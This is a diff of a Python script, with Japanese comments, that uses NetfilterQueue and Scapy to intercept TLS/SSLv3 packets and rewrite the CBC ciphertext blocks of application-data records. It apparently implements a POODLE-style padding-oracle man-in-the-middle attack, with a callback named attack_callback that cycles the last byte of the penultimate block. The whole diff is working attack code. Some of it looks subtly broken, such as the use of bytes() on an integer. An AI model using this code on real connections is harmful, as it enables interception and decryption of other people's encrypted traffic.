@@ -1,16 +1,31 @@
 from netfilterqueue import NetfilterQueue
+import sys
 from scapy.all import *
 from scapy.layers.tls.all import TLS
 from scapy.layers.http import *
 from scapy.layers.tls import *
 from scapy.all import IP, TCP
-from scapy.layers.inet import IP, TCP
+from scapy.layers.inet import IP, TCP, ICMP
 
 config = json.load(open('../config.json'))
 
 
 def get_field(layer, field_name):
     return layer.get_field(field_name).i2repr(layer, getattr(layer, field_name))
+
+
+def get_tls_field(packet_bytes, field_name):
+    """
+    TLSヘッダーから特定のフィールド値を取得する関数。
+    """
+    if field_name == "type":
+        return packet_bytes[0]  # 最初の1バイトがTLSのContent Type
+    elif field_name == "version":
+        return packet_bytes[1:3]  # 2〜3バイトがTLSのバージョン
+    elif field_name == "length":
+        # 4〜5バイトがペイロードの長さ
+        return int.from_bytes(packet_bytes[3:5], byteorder='big')
+    return None
 
 
 def is_sslv3_packet(pkt):
@@ -38,17 +53,48 @@ def is_sslv3_packet(pkt):
     return True
 
 
+def is_tls_packet(pkt):
+    if TCP not in pkt:
+        return False
+
+    payload = bytes(pkt[TCP].payload)
+
+    # ペイロードの最小サイズ確認
+    if len(payload) < 5:
+        return False
+
+    # TLSフィールドを確認
+    content_type = payload[0]
+    version = payload[1:3]
+
+    if content_type not in [20, 21, 22, 23]:  # TLS Content Type
+        return False
+
+    # SSLv3, TLS1.0, 1.1, 1.2
+    if version not in [b'\x03\x00', b'\x03\x01', b'\x03\x02', b'\x03\x03']:
+        return False
+
+    return True
+
+
 packet_count = 0
 previous_packet_tls_payload = None
+last_byte_of_the_penultimate_block = 0x00
 
 
 def attack_callback(packet):
     global packet_count
     global previous_packet_tls_payload
+    global last_byte_of_the_penultimate_block
 
     pkt = IP(packet.get_payload())
 
-    if not TLS in pkt:
+    if ICMP in pkt or pkt[TCP].flags == "RA":  # TCP再送信フラグチェック
+        packet.accept()
+        return
+
+    tls_layer_bytes = bytes(pkt[TCP].payload)
+    if not is_tls_packet(pkt):
         packet.accept()
         return
 
@@ -60,24 +106,20 @@ def attack_callback(packet):
         packet.accept()
         return
 
-    packet_type = get_field(pkt.getlayer(TLS), 'type')
+    tls_layer_bytes = bytes(pkt.getlayer(TLS))
+    tls_type = get_tls_field(tls_layer_bytes, "type")
 
-    if packet_type == "application_data":
-        print("tott")
+    if tls_type == 23:
         if packet_count == 0:
             print("first packet")
             previous_packet_tls_payload = bytes(pkt.getlayer('TLS'))[5:]
-#            print("------------------------------------raw")
-#            hexdump(bytes(pkt.getlayer(TLS)))
-#            print("------------------------------------raw")
-#            print("------------------payload---------------")
-#            hexdump(previous_packet_tls_payload)
-#            print("------------------payload---------------")
-            packet_count += 1
             packet.accept()
+            packet_count += 1
             return
-        elif packet_count == 1:
-            print("modify")
+        elif packet_count <= 6:
+            last_byte_of_the_penultimate_block += 1
+            # print(f"0x{last_byte_of_the_penultimate_block:02x}")
+            hexdump(pkt.payload)
             current_packet_tls_header = bytes(pkt.getlayer('TLS'))[:5]
             current_packet_tls_payload = bytes(pkt.getlayer('TLS'))[5:]
 
@@ -94,16 +136,10 @@ def attack_callback(packet):
 
             # 最後のブロックを真ん中のブロックに置き換え
             current_packet_tls_payload_modified = (
-                current_packet_tls_payload[:-block_size] +
+                current_packet_tls_payload[:-(block_size+1)] +
+                bytes(last_byte_of_the_penultimate_block) +
                 current_packet_tls_payload_middle_block
             )
-
-            print("---------------current_packet_tls_payload---------------")
-            hexdump(current_packet_tls_payload)
-            print("---------------current_packet_tls_payload---------------")
-            print("---------------modified------------------------------")
-            hexdump(current_packet_tls_payload_modified)
-            print("---------------modified------------------------------")
 
             # 新しいペイロードを作成
             new_payload = current_packet_tls_header + current_packet_tls_payload_modified
@@ -114,10 +150,14 @@ def attack_callback(packet):
             del pkt[IP].chksum
 
             packet.set_payload(bytes(pkt))
+            print(packet_count)
+            packet_count += 1
             packet.accept()
             return
 
+    print("hoge")
     packet.accept()
+    return
 
 
 try:
